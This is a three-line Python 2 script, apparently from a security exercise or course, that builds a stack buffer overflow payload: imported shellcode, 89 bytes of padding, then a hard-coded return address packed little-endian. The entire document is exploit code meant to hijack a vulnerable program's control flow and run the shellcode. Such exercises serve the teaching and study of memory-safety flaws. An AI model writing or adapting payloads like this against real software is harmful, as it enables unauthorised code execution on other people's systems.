from shellcode import shellcode
from struct import pack

print shellcode + "a"*89 + pack("<I", 0xbffeeccc)
